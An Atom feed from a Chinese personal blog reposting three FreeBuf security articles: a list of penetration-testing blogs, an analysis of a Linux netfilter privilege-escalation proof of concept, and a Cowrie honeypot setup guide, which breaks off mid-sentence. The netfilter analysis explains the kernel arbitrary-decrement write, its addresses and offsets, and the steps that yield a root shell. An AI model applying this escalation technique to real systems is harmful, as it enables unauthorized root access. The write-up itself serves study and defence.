<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ζั͡ޓ̯̯̯͡͡طىއއއ๓冰</title>
  <subtitle>个人博客网站--记录生活所得</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.linux52.com/"/>
  <updated>2016-10-11T15:06:06.000Z</updated>
  <id>http://www.linux52.com/</id>
  
  <author>
    <name>ζั͡ޓ̯̯̯͡͡طىއއއ๓冰</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>13个有用的渗透测试资源博客</title>
    <link href="http://www.linux52.com/2016-09-09-13-e4-b8-aa-e6-9c-89-e7-94-a8-e7-9a-84-e6-b8-97-e9-80-8f-e6-b5-8b-e8-af-95-e8-b5-84-e6-ba-90-e5-8d-9a-e5-ae-a2.html"/>
    <id>http://www.linux52.com/2016-09-09-13-e4-b8-aa-e6-9c-89-e7-94-a8-e7-9a-84-e6-b8-97-e9-80-8f-e6-b5-8b-e8-af-95-e8-b5-84-e6-ba-90-e5-8d-9a-e5-ae-a2.html</id>
    <published>2016-09-09T03:34:45.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>渗透测试是寻找能够用来攻击应用程序、网络和系统的漏洞的过程，其目的是检测会被黑客攻击的安全脆弱点。渗透测试可以检测如下内容：系统对攻击的反应，存在哪些会被攻击的脆弱点，如果有，系统中哪些数据会被窃取。</strong></p>
<h2 id="关于渗透测试"><a href="#关于渗透测试" class="headerlink" title="关于渗透测试"></a>关于渗透测试</h2><p>不要将渗透测试等同于简单的漏洞扫描或者安全审计，它还要除此之外的工作。渗透测试有助于寻找非常复杂的攻击向量，找到在开发阶段没能检测出来的漏洞。在遭到入侵之后，也常使用渗透测试，检测攻击者的攻击方法，还原出攻击方法，并阻止与此相同的攻击。</p>
<p>渗透测试是一些安全审计的主要构成部分，包括<a href="https://www.checkmarx.com/white_papers/how-to-achive-pci-dss-compliance-with-checkmarx-source-code-analysis/" target="_blank" rel="external">PCI-DSS规则</a>，它要求对处理或保存支付信息的系统每年进行渗透测试。渗透测试人员会协同使用人工和自动测试，利用大量的工具进行测试。</p>
<p>由于安全世界的动态性，以及黑客的变化性，安全专家需要掌握最新的技术、工具和漏洞利用方法，以及渗透测试技术。应用程序安全是一个新领域，物联网、容器、云等新的安全风险不断出现，渗透测试人员需要不断更新自己的知识。</p>
<p>因此，我们提供13个最有用的渗透测试博客，帮你获取最新知识，激励你的白帽人生。其中一些有好几年的渗透测试历程了。他们都值得你关注和学习。</p>
<p><a href="http://image.3001.net/images/20160831/14726207762774.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160831/14726207762774.png!small" alt="“If-I-had-6-h-to-chop-down-a-tree-I’d-spend-the-first-four-of-them-sharpening-my-axe.”-1.png"></a></p>
<h2 id="渗透测试博客和资源排名"><a href="#渗透测试博客和资源排名" class="headerlink" title="渗透测试博客和资源排名"></a>渗透测试博客和资源排名</h2><p><a href="http://carnal0wnage.attackresearch.com/" target="_blank" rel="external">Carnal0wnage</a></p>
<p>这个博客是由一个攻击研究团队维护的，是渗透测试人员最好的信息来源之一，博客上发布了渗透测试技术、发现、新闻等等。该团队在Black Hat上开设了培训课程。</p>
<p><a href="https://www.pentestgeek.com/" target="_blank" rel="external">PentestGeek</a></p>
<p>2012年开始活跃，PentestGeek博客致力于分享作者的经验。通过它也可以了解在大公司工作的经验丰富的渗透测试者的每日工作。</p>
<p><a href="http://www.darknet.org.uk/" target="_blank" rel="external">Darknet</a></p>
<p>1999年从一个IRC频道开始发展壮大，目前是一个定期更新的博客，讨论最新的渗透测试新闻、工具和技术，有30,000多个用户。</p>
<p><a href="http://www.lanmaster53.com/" target="_blank" rel="external">Lanmaster53</a></p>
<p>Tim Tomes维护的博客，Tim在博客中会详细描述他的研究成果，博客内容覆盖从Linux Shells、DEFCON badge hacking到AppSec hacks。</p>
<p><a href="http://marcoramilli.blogspot.co.il/" target="_blank" rel="external">Marco Ramilli</a></p>
<p>Marco是一个安全研究者和白帽黑客。他在教育界也很有名气，在数十年的工作经历中担任了各种教授和研究员职位。他的博客是对他的知识的扩展，Macro在博客上记录他发现的一些绝妙的技术。</p>
<p><a href="http://www.commonexploits.com/" target="_blank" rel="external">Common Exploits</a></p>
<p>由Daniel Compton维护，他是有20年的透测试经验的专家，Common Exploits旨在分享Daniel的技术，工具、漏洞利用方面的新闻，以及其它渗透测试领域的内容。</p>
<p><a href="http://pen-testing.sans.org/blog/pen-testing" target="_blank" rel="external">SANS Penetration Testing Blog</a></p>
<p>SANS对于应用程序安全方面的人来说是一个非常好的资源。这个博客上可以找到各种渗透测试任务和挑战，用于测试你的能力，也会发布特定的渗透测试工具和技术。</p>
<p><a href="https://blog.trailofbits.com/" target="_blank" rel="external">Trail of Bits Blog</a></p>
<p>由维护Trails of Bits的团队写的博客，这是一个在攻防领域都很专业的安全公司，这个博客收集了他们分享的知识，帮助企业改进或修复安全问题。</p>
<p><a href="http://www.digininja.org/" target="_blank" rel="external">DigiNinja</a></p>
<p>Digininja对渗透测试者来说是一个必须要知道的资源，主要关注Metasploit、Wifi和网络，Digininja是信息安全领域的人必读的网站。</p>
<p><a href="https://www.linkedin.com/groups/81676" target="_blank" rel="external">Ethical Hacking LinkedIn Group</a></p>
<p>最好的获取最新渗透测试新闻的办法是，在你喜欢的社交网站中，加入到一个组里面或者关注渗透测试大牛。Ethical Hacking group是众多社区中的一个，你可以加入并分享你自己的渗透测试资源。</p>
<p><a href="http://www.ehacking.net/" target="_blank" rel="external">EHacking.net</a></p>
<p>对所有渗透测试相关人员来说是一个非常棒的资源，Ehacking.net是又一个必须加入到书签的网站。</p>
<p><a href="http://seclists.org/" target="_blank" rel="external">Seclists.org</a></p>
<p>现在，依然有一部分信息安全社区依靠邮件列表获取信息，尽管这看起来有些过时。Nmap Security Scanner人员运营着Seclists.org网站，提供了受欢迎的邮件列表的清单。不管是菜鸟还是渗透测试专家都可以找到适合自己的邮件列表。</p>
<p><a href="http://www.kitploit.com/" target="_blank" rel="external">Kitploit</a></p>
<p>如果你在寻找特定类型的工具，你可以在Kitploit网站上找到。这里是渗透测试工具的宝库，把它加入到你的书签吧。</p>
<p><strong>* 参考来源：<a href="https://www.checkmarx.com/2016/07/26/13-helpful-pentesting-resources/" target="_blank" rel="external">checkmarx</a>，felix编译，转载请注明来自FreeBuf黑客与极客（FreeBuf.COM）</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;渗透测试是寻找能够用来攻击应用程序、网络和系统的漏洞的过程，其目的是检测会被黑客攻击的安全脆弱点。渗透测试可以检测如下内容：系统对攻击的反应，存在哪些会被攻击的脆弱点，如果有，系统中哪些数据会被窃取。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;关于渗透测试&quot;
    
    </summary>
    
      <category term="freebuf" scheme="http://www.linux52.com/categories/freebuf/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux netfilter OOB root提权漏洞分析</title>
    <link href="http://www.linux52.com/2016-09-09-linux-netfilter-oob-root-e6-8f-90-e6-9d-83-e6-bc-8f-e6-b4-9e-e5-88-86-e6-9e-90.html"/>
    <id>http://www.linux52.com/2016-09-09-linux-netfilter-oob-root-e6-8f-90-e6-9d-83-e6-bc-8f-e6-b4-9e-e5-88-86-e6-9e-90.html</id>
    <published>2016-09-09T03:31:38.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>* 本文原创作者：肥肥草，本文属FreeBuf原创奖励计划，未经许可禁止转载
</strong></p>
<p><strong>著名的ExploitDatabase网站（<a href="http://www.exploit-db.com/" target="_blank" rel="external">www.exploit-db.com</a>）最近贴出了一个netfilter模块的提权POC，作者是Vitaly Nikolenko。OOB！Netfilter！顿感好奇，决定分析一下，现将分析过程和成果分享如下。</strong></p>
<h2 id="0×0-依葫芦画瓢提权成功"><a href="#0×0-依葫芦画瓢提权成功" class="headerlink" title="0×0 依葫芦画瓢提权成功"></a>0×0 依葫芦画瓢提权成功</h2><p>参照文章的提示，下载Ubuntu16.04并成功安装，uname -a确认版本号为4.4.0-21-generic。</p>
<p><a href="http://image.3001.net/images/20160826/14721806097863.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721806097863.png!small" alt=""></a></p>
<p>下载POC，编译，按照提示关闭SMEP，加载ip_tables.ko，运行decr，等到出现“Done!Nowrun.pwn”后运行pwn，成功获得root shell。</p>
<p><a href="http://image.3001.net/images/20160826/14721806553492.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721806553492.png!small" alt=""></a></p>
<p><a href="http://image.3001.net/images/20160826/14721806638786.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721806638786.png!small" alt=""></a></p>
<h2 id="0×01-漏洞初识"><a href="#0×01-漏洞初识" class="headerlink" title="0×01 漏洞初识"></a>0×01 漏洞初识</h2><p>查看pwn.c的代码，可以看出POC采用了常见的通过ptmx提权方法：</p>
<p><a href="http://image.3001.net/images/20160826/14721806734085.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721806734085.png!small" alt=""></a></p>
<p>猜测decr中修改了ptmx_fops的release指针，并根据代码可推断出修改后该指针的值为0xff814e30b0。然后pwn中调用close(fd)调用ptmx_fops-&gt;release函数，从而提权。</p>
<p>事实是否如此呢？</p>
<p>通过cat/proc/kallsyms查看ptmx_fops的地址为0xffffffff821de3e0，则release指针所在地址为0xffffffff821de3e0 + 13*8 = 0xffffffff821de448。</p>
<p>通过kgdb进行调试，查看在decr运行之前，0xffffffff821de448的值0xffffffff814e30b0，如下图所示：</p>
<p><a href="http://image.3001.net/images/20160826/14721806934221.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721806934221.png!small" alt=""></a></p>
<p>运行decr之后，0xffffffff821de448地址的值，为0x ff814e30b0，如下图所示：</p>
<p><a href="http://image.3001.net/images/20160826/14721806982781.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721806982781.png!small" alt=""></a></p>
<p>也就是说，decr运行之后，0xffffffff821de448地址的值由0xffffffff814e30b0被修改为0xff814e30b0，而0xff814e30b0地址是应用层地址，是可控的，在pwn代码中向0xff814e30b0地址写入了提权ShellCode。</p>
<p>下面的问题就是decr是如何做到的，内核漏洞在哪？</p>
<h2 id="0×02-定位修改ptmx-fops关键指令"><a href="#0×02-定位修改ptmx-fops关键指令" class="headerlink" title="0×02 定位修改ptmx_fops关键指令"></a>0×02 定位修改ptmx_fops关键指令</h2><p>仔细分析decr.c，无非是设置了ipt_replace、ipt_entry等数据结构，然后调用setsockopt函数设置内核，看完之后仍然毫无头绪，还得从内核着手，看看应用层在调用完setsockopt函数之后内核到底做了那些事。</p>
<p>一种思路是重新编译内核，这样可以实现源码级的内核调试，但是重新编译之后一些内核参数（如ptmx_fops）地址发生改变，POC可能会运行失败，这样不利于定位修改ptmx_fops的漏洞代码。</p>
<p>所以还是针对Ubuntu16.04原生的内核进行调试，采用源码分析+动态调试的方法定位修改ptmx_fops的关键指令。本次采用的动态调试方法为vmware双虚拟机kgdb调试方法，具体方法可以通过百度获得，文中不再复述。</p>
<p>查看ip_tables.c源码，首先找到模块初始化函数ip_tables_init：</p>
<p><a href="http://image.3001.net/images/20160826/14721807126257.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807126257.png!small" alt=""></a></p>
<p>在ip_tables_init中，调用nf_register_sockopt注册处理函数，注册参数如下所示。</p>
<p><a href="http://image.3001.net/images/20160826/14721807201963.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807201963.png!small" alt=""></a></p>
<p>set函数有两个，do_ipt_set_ctl和compat_do_ipt_set_ctl，内核会调用哪一个函数呢？</p>
<p>通过kgdb双虚拟机调试，分别设置两个函数为断点，发现当应用层调用setsockopt时，内核调用的是compat_do_ipt_set_ctl，如下图所示。</p>
<p><a href="http://image.3001.net/images/20160826/14721807368122.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807368122.png!small" alt=""></a></p>
<p>继续分析，获得如下函数执行路径：</p>
<pre><code>compat_&lt;span class=&quot;hljs-keyword&quot;&gt;do&lt;/span&gt;_ipt_&lt;span class=&quot;hljs-built_in&quot;&gt;set&lt;/span&gt;_ctl--&amp;gt; compat_&lt;span class=&quot;hljs-keyword&quot;&gt;do&lt;/span&gt;_replace --&amp;gt; translate_compat_table --&amp;gt; check_compat_entry_size_and_hooks
</code></pre><p>POC代码中提示check_compat_entry_size_and_hooks/check_entry有问题，那么重点分析check_compat_entry_size_and_hooks函数，看是在那一步去修改了ptmx_fops，最好的办法是动态调试。</p>
<p>经过痛苦的、纯体力活的kgdb汇编代码调试，最终定位到是在compat_release_entry函数中修改了ptmx_fops，并且修改了两次，进一步跟踪定位到是该函数中的两个module_put函数修改了ptmx_fops。</p>
<p><a href="http://image.3001.net/images/20160826/14721807427692.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807427692.png!small" alt=""></a></p>
<p>同时通过打印$rdi（module_put的第一个参数）的值，发现该值为0xffffffff821de10d，如下所示：</p>
<p><a href="http://image.3001.net/images/20160826/14721807541402.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807541402.png!small" alt=""></a></p>
<p>而该值正是decr.c中设置的magicnumber，如下图所示：</p>
<p><a href="http://image.3001.net/images/20160826/14721807629599.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807629599.png!small" alt=""></a></p>
<p>再看module_put函数：</p>
<p><a href="http://image.3001.net/images/20160826/14721807696298.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807696298.png!small" alt=""></a></p>
<p>其中最关键的就是对modue-&gt;refcnt减一。</p>
<p>refcnt在structmodule结构中的偏移为0×340，因此&amp;module-&gt;refcnt的值为 0xffffffff821de10d + 0×340 = 0xffffffff821de44d， 而ptmx_fops-&gt;tty_release的地址为0xffffffff821de448，因此当执行减一操作后，会将0xffffffff821de44d开始的0xff 0xff 0xff逐步减为0，最终ptmx_fops-&gt;tty_release的值变为0xff814e30b0。</p>
<p><a href="http://image.3001.net/images/20160826/14721807796432.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807796432.png!small" alt=""></a></p>
<p>到此，总算搞明白了，应用层通过构造特殊的ipt_replace、ipt_entry、xt_entry_match、xt_standard_target结构，将一个值为magic number的地址传到内核，并让内核中对该地址的内容执行多次-1操作，从而达到修改ptmx_fops的目的。</p>
<h2 id="0×03-漏洞成因分析"><a href="#0×03-漏洞成因分析" class="headerlink" title="0×03 漏洞成因分析"></a>0×03 漏洞成因分析</h2><p>通过上节分析知道，该漏洞可以在内核中修改应用层指定的地址，执行递减1的修改操作。那么内核代码中的漏洞到底在哪呢？</p>
<p>继续分析内核源代码ip_tables.c，既然问题出在ematch-&gt;u.kernel.match-&gt;me和t-&gt;u.kernel.target-&gt;me上，那么转到与之相关的代码处，即compat_copy_entry_from_user函数内部的代码，重点分析以下代码：</p>
<p><a href="http://image.3001.net/images/20160826/14721807991799.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807991799.png!small" alt=""></a></p>
<p>将xt_ematch_foreach函数展开，如下：</p>
<p><a href="http://image.3001.net/images/20160826/14721808081529.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721808081529.png!small" alt=""></a></p>
<p>entry-&gt;elems指向的是紧跟在ipt_entry后的xt_entry_match（见如下示意图），即entry-&gt;elems= entry + sizeof(ipt_entry)，而sizeof(ipt_entry) = 112字节。</p>
<p><a href="http://image.3001.net/images/20160826/14721808182831.gif" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721808182831.gif!small" alt=""></a></p>
<p>由于应用层设置的target_offset为74，导致判断语句</p>
<p>(pos)&lt; (struct xt_entry_match <em>)(<span class="hljs-function"><span class="hljs-params">(char </span></span></em>)(entry) + \</p>
<p><span class="hljs-function"><span class="hljs-params">(entry)</span>-&gt;</span>target_offset); \</p>
<p>返回的结果为<strong>false</strong>，因此整个循环一次未能执行，也即compat_find_calc_match函数未能执行，本应在compat_find_calc_match函数中设置ematch-&gt;u.kernel.match-&gt;me的指令也未能执行。</p>
<p>与ematch错误处理情况类似，这段代码中，由于应用层设置的target_offset为74，导致t = compat_ipt_get_target()函数获取的target是错误的，后面尽管通过t-&gt;u.kernel.target= target;设置了target，但设置到了错误的地址，未改变真正的t-&gt;u.kernel.target值。</p>
<h2 id="0×4漏洞总结"><a href="#0×4漏洞总结" class="headerlink" title="0×4漏洞总结"></a>0×4漏洞总结</h2><p><strong>综上所属，该漏洞是内核netfilter处理setsockopt相关代码（check_compat_entry_size_and_hooks和check_entry函数）在处理应用层传下来的数据时审查不严格，处理逻辑也存在缺陷，使内核在调用module_put函数时操作了应用层传下来的地址，导致内核直接对应用层输入的地址执行减一操作，相当于是内核任意地址写漏洞。</strong></p>
<p>该漏洞要利用内核模块的module_put函数，而Android系统一般不打开内核模块动态加载功能，因此本文介绍的漏洞利用方法无法在Android系统上成功执行。</p>
<p>最近爆出和netfilters/getsockopt相关的漏洞不少，如CVE-2016-3134，后期将继续分析其他漏洞。</p>
<p>欢迎技术交流。本人QQ:16588753，root技术交流群:437812386。</p>
<p><strong>* 本文原创作者：肥肥草，本文属FreeBuf原创奖励计划，未经许可禁止转载 </strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;* 本文原创作者：肥肥草，本文属FreeBuf原创奖励计划，未经许可禁止转载
&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;著名的ExploitDatabase网站（&lt;a href=&quot;http://www.exploit-db.com/&quot; target=
    
    </summary>
    
      <category term="freebuf" scheme="http://www.linux52.com/categories/freebuf/"/>
    
    
  </entry>
  
  <entry>
    <title>Cowrie蜜罐部署教程</title>
    <link href="http://www.linux52.com/2016-09-09-cowrie-e8-9c-9c-e7-bd-90-e9-83-a8-e7-bd-b2-e6-95-99-e7-a8-8b.html"/>
    <id>http://www.linux52.com/2016-09-09-cowrie-e8-9c-9c-e7-bd-90-e9-83-a8-e7-bd-b2-e6-95-99-e7-a8-8b.html</id>
    <published>2016-09-09T03:30:48.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0-蜜罐分类："><a href="#0-蜜罐分类：" class="headerlink" title="0.蜜罐分类："></a>0.蜜罐分类：</h2><blockquote>
<p>低交互：模拟服务和漏洞以便收集信息和恶意软件，但是攻击者无法和该系统进行交互；</p>
<p>中等交互：在一个特有的控制环境中模拟一个生产服务，允许攻击者的部分交互；</p>
<p>高交互：攻击者可以几乎自由的访问系统资源直至系统重新清除恢复。<br><a href="http://image.3001.net/images/20160816/14713429741384.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713429741384.png!small" alt="Clipboard Image.png"></a></p>
</blockquote>
<h2 id="1-cowrie简介"><a href="#1-cowrie简介" class="headerlink" title="1.cowrie简介"></a><strong>1.cowrie简介</strong></h2><p><strong>它是一个具有中等交互的SSH蜜罐，安装在Linux中，它可以获取攻击者用于暴力破解的字典、输入的命令以及上传或下载的恶意文件。攻击者在上传恶意文件后，执行恶意文件的操作均会失败，所以对蜜罐本身来说比较安全。</strong></p>
<p><a href="http://image.3001.net/images/20160816/14713421328918.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713421328918.png!small" alt="Clipboard Image.png"></a></p>
<h2 id="2-cowrie安装部署"><a href="#2-cowrie安装部署" class="headerlink" title="2.cowrie安装部署"></a>2.cowrie安装部署</h2><p>以下步骤均为root权限执行</p>
<p>l 添加非root用户</p>
<pre><code>adduser cowrie –p &lt;span class=&quot;hljs-strong&quot;&gt;*****&lt;/span&gt;**(设置密码，一路回车即可)
`&lt;/pre&gt;
l 安装各种python相关包
&lt;pre&gt;`apt-&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt; install python-twistedpython-crypto python-pyasn1 python-gmpy2 python-mysqldb python-zope.&lt;span class=&quot;hljs-keyword&quot;&gt;interface&lt;/span&gt;
`&lt;/pre&gt;
l 安装virtualenv
&lt;pre&gt;`apt-&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt; install virtualenv
`&lt;/pre&gt;
l 下载cowire
&lt;pre&gt;`&lt;span class=&quot;hljs-built_in&quot;&gt;cd&lt;/span&gt; /optgit &lt;span class=&quot;hljs-built_in&quot;&gt;clone&lt;/span&gt; http://github.com/micheloosterhof/cowrie
`&lt;/pre&gt;
l 配置python虚拟环境
&lt;pre&gt;`cd &lt;span class=&quot;hljs-meta-keyword&quot;&gt;/opt/&lt;/span&gt;cowrie-master（cowrie-master就是我cowrie蜜罐的目录，如果目录不一致，重命名即可）virtualenv cowrie-envsource cowrie-env&lt;span class=&quot;hljs-meta-keyword&quot;&gt;/bin/&lt;/span&gt;activate(cowrie-env) $ pip install twistedcryptography pyopenssl gmpy2
`&lt;/pre&gt;
l 改变/opt/cowrie-master的拥有者
&lt;pre&gt;`&lt;span class=&quot;hljs-keyword&quot;&gt;chown&lt;/span&gt; -R cowrie:cowrie /opt/cowrie-master
`&lt;/pre&gt;
l 建立cowrie配置文件
&lt;pre&gt;`&lt;span class=&quot;hljs-selector-tag&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;cowrie&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.cfg&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.dist&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;cowrie&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.cfg&lt;/span&gt;
`&lt;/pre&gt;
l 修改日志的umask为0022（默认为0077）
&lt;pre&gt;`&lt;span class=&quot;hljs-built_in&quot;&gt;cd&lt;/span&gt; /opt/cowrie-mastervi start.sh
`&lt;/pre&gt;
[![Clipboard Image.png](http://image.3001.net/images/20160816/14713422633445.png!small)](http://image.3001.net/images/20160816/14713422633445.png)

l 修改蜜罐的SSH端口（默认为2222）
&lt;pre&gt;`&lt;span class=&quot;hljs-built_in&quot;&gt;cd&lt;/span&gt; /opt/cowrie-mastervi cowrie.cfg
`&lt;/pre&gt;
将linsten_port改为62223即可（最好大于60000，以防止被nmap默认扫描到）

[![Clipboard Image.png](http://image.3001.net/images/20160816/14713422921080.png!small)](http://image.3001.net/images/20160816/14713422921080.png)

l 将公网访问服务器22端口的请求做端口转发，转发到蜜罐的端口中
&lt;pre&gt;`&lt;span class=&quot;hljs-attribute&quot;&gt;iptables&lt;/span&gt; -t nat -A PREROUTING -p tcp--dport &lt;span class=&quot;hljs-number&quot;&gt;22&lt;/span&gt; -j REDIRECT --to-port &lt;span class=&quot;hljs-number&quot;&gt;62223&lt;/span&gt;
`&lt;/pre&gt;
l 将真正的（非蜜罐）SSH管理端口改为65522
&lt;pre&gt;`vi &lt;span class=&quot;hljs-meta-keyword&quot;&gt;/etc/&lt;/span&gt;ssh/sshd_config
`&lt;/pre&gt;
（备注：在第一次改SSH端口时，在前期测试时强烈建议同时保留22与65522，以防止修改保存后出现故障无法连接65522）

[![Clipboard Image.png](http://image.3001.net/images/20160816/14713423512894.png!small)](http://image.3001.net/images/20160816/14713423512894.png)

此处切换为cowrie用户操作

&lt;span style=&quot;color: #333333;&quot;&gt; 启动蜜罐&lt;/span&gt;
&lt;pre&gt;`&lt;span class=&quot;hljs-built_in&quot;&gt;cd&lt;/span&gt; /opt/cowrie-master./start.sh
`&lt;/pre&gt;

## 3\. 数据库安装部署

cowrie中产生的日志杂乱无章，即使放到日志分析工具中也很难制定规则去筛选。然而cowrie具备将攻击IP、时间、历史执行命令等记录直接存在数据库中，下面将说明如何配置数据库。

需要root权限或者sudo

l 安装mysql基础环境
&lt;pre&gt;`apt-get &lt;span class=&quot;hljs-keyword&quot;&gt;install&lt;/span&gt; libmysqlclient-devpython-dev pip &lt;span class=&quot;hljs-keyword&quot;&gt;install&lt;/span&gt; mysql-python apt-&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;install&lt;/span&gt; mysql-&lt;span class=&quot;hljs-keyword&quot;&gt;server&lt;/span&gt; python-mysqldb
`&lt;/pre&gt;
[![Clipboard Image.png](http://image.3001.net/images/20160816/1471342497649.png!small)](http://image.3001.net/images/20160816/1471342497649.png)

l 配置数据库与表

使用root用户建立名为cowrie的数据库并将该库中的所有表授权给cowrie
&lt;pre&gt;`&lt;span class=&quot;hljs-selector-tag&quot;&gt;mysql&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;-pEnter&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;password&lt;/span&gt;: ******* &lt;span class=&quot;hljs-selector-tag&quot;&gt;mysql&lt;/span&gt;&amp;gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;DATABASE&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;cowrie&lt;/span&gt;;&lt;span class=&quot;hljs-selector-tag&quot;&gt;mysql&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;GRANT&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;ALL&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;cowrie&lt;/span&gt;.* &lt;span class=&quot;hljs-selector-tag&quot;&gt;TOcowrie&lt;/span&gt;@&lt;span class=&quot;hljs-keyword&quot;&gt;localhost&lt;/span&gt; IDENTIFIED BY &lt;span class=&quot;hljs-string&quot;&gt;&apos;your_password&apos;&lt;/span&gt;;&lt;span class=&quot;hljs-selector-tag&quot;&gt;mysql&lt;/span&gt;&amp;gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;exit&lt;/span&gt;
`&lt;/pre&gt;
此时进入cowrie安装目录中，使用cowrie用户登录数据库，进入cowrie库中，将/opt/cowrie/ doc/sql/mysql.sql作为数据源即可制成多个表。
&lt;pre&gt;`&lt;span class=&quot;hljs-built_in&quot;&gt;cd&lt;/span&gt; /opt/cowrie-master mysql -u cowrie –pEnter password: ******* mysql&amp;gt;USE cowrie;mysql&amp;gt;&lt;span class=&quot;hljs-built_in&quot;&gt;source&lt;/span&gt; ./doc/sql/mysql.sqlmysql&amp;gt;&lt;span class=&quot;hljs-built_in&quot;&gt;exit&lt;/span&gt;
`&lt;/pre&gt;
停止cowrie，修改配置文件中的数据库配置，使配置文件中的密码与cowrie数据库用户密码一致。
&lt;pre&gt;`./&lt;span class=&quot;hljs-keyword&quot;&gt;stop&lt;/span&gt;.shvi cowrie.cfg
`&lt;/pre&gt;
[![Clipboard Image.png](http://image.3001.net/images/20160816/14713425641004.png!small)](http://image.3001.net/images/20160816/14713425641004.png)

保存后退出，并su到cowrie用户重启蜜罐
&lt;pre&gt;`./&lt;span class=&quot;hljs-keyword&quot;&gt;start&lt;/span&gt;.sh
</code></pre><p>cowrie库中的数据表如下：</p>
<p><a href="http://image.3001.net/images/20160816/14713425861902.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713425861902.png!small" alt="Clipboard Image.png"></a></p>
<h2 id="4-配置文件说明"><a href="#4-配置文件说明" class="headerlink" title="4. 配置文件说明"></a>4. 配置文件说明</h2><p>data/userdb.txt——设置外部连接蜜罐时的密码，可以设置稍微复杂但是在攻击字典里，诱使攻击者进行暴力破解并获取其行为。</p>
<p><a href="http://image.3001.net/images/20160816/14713427507623.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713427507623.png!small" alt="Clipboard Image.png"></a></p>
<p>log/cowrie.json与 log/cowrie.log——均为日志</p>
<p><a href="http://image.3001.net/images/20160816/14713427565036.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713427565036.png!small" alt="Clipboard Image.png"></a></p>
<p>txtcmds/*——均为假的命令，其实打开就会发现完全就是txt</p>
<p><a href="http://image.3001.net/images/20160816/14713427601224.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713427601224.png!small" alt="Clipboard Image.png"></a></p>
<p>dl/*——攻击者上传的文件均会复制到这里</p>
<p><a href="http://image.3001.net/images/20160816/14713427664682.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713427664682.png!small" alt="Clipboard Image.png"></a></p>
<p>honeyfs/etc/motd——自定义欢迎/警告banner</p>
<p><a href="http://image.3001.net/images/20160816/14713427704917.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713427704917.png!small" alt="Clipboard Image.png"></a></p>
<h2 id="5-阶段成果"><a href="#5-阶段成果" class="headerlink" title="5. 阶段成果"></a>5. 阶段成果</h2><p>如果想查询蜜罐中是否有攻击者的痕迹，SSH登录服务器后进入数据库，使用cowrie库，查询auth、sessions、input等表即可。<br>公网恶意IP可以从sessions表中去重获取，算是少量的威胁情报了，部分恶意IP如下。</p>
<p><a href="http://image.3001.net/images/20160816/14713427888255.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713427888255.png!small" alt="Clipboard Image.png"></a></p>
<p>记录攻击者操作如下：</p>
